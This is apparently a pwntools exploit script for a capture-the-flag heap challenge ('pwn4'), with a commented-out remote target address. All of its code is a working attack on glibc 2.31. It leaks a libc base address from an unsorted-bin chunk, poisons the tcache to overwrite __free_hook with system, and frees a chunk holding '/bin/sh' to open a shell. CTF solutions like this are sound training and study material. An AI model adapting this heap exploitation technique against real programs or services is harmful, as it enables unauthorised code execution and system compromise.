from pwn import *
io=process('./pwn4')
#io = remote('113.201.14.253',16222)
elf=ELF('./pwn4')
libc=ELF('/home/yrl/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6')
context.log_level='debug'
context.terminal = ["/bin/tmux", "sp",'-h']
dbg = lambda text=None  : gdb.attach(io, text)
def add(index,name,key,value):
 io.sendlineafter('Your choice: ','1')
 io.sendlineafter('Your index: ',str(index))
 io.sendlineafter('Enter your name: ',name)
 io.sendlineafter('Please input a key: ',key)
 io.sendlineafter('Please input a value: ',str(value))
 
def show(index):
 io.sendlineafter('Your choice: ','2')
 io.sendlineafter('Your index: ',str(index))

def edit(index,name,length,key,value):
 io.sendlineafter('Your choice: ','3')
 io.sendlineafter('Your index: ',str(index))
 io.sendlineafter('Enter your name: ',name)
 io.sendlineafter('New key length: ',str(length))
 io.sendlineafter('Key: ',key)
 io.sendlineafter('Value: ',str(value))
 
def dele(index):
 io.sendlineafter('Your choice: ','4')
 io.sendlineafter('Your index: ',str(index))
 
def exp():
 # largebin
 add(0,'f1ag','a'*0x417,0)

 # tcache
 add(1,'f1ag','a'*0x3c7,1)
 # free to unsortedbin
 dele(0)
 show(0)
 malloc_hook = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 -16
 libc_base = malloc_hook - libc.symbols['__malloc_hook']
 print('libc_base',hex(libc_base))
 free_hook = libc.symbols['__free_hook'] + libc_base
 system = libc.symbols['system'] + libc_base
 
 # malloc from unsortedbin
 add(2,'f1ag','a'*0x57,2)
 add(3,'f1ag','a'*0x57,3)
 # make tcache attack
 dele(3)
 dele(2)
 dbg()
 # write /bin/sh to chunk
 edit(1,'f1ag',8,'/bin/sh\x00',1)
 # write to freehook
 edit(2,'f1ag',6,p32((free_hook-0x51)&0xffffffff)+p16(((free_hook)>>32)&0xffff),2)
 
 # modify freehook to system
 add(4,'f1ag','a'*0x51+p32((system)&0xffffffff)+p16(((system)>>32)&0xffff),'4')
 
 dele(1)
 io.interactive()
exp()
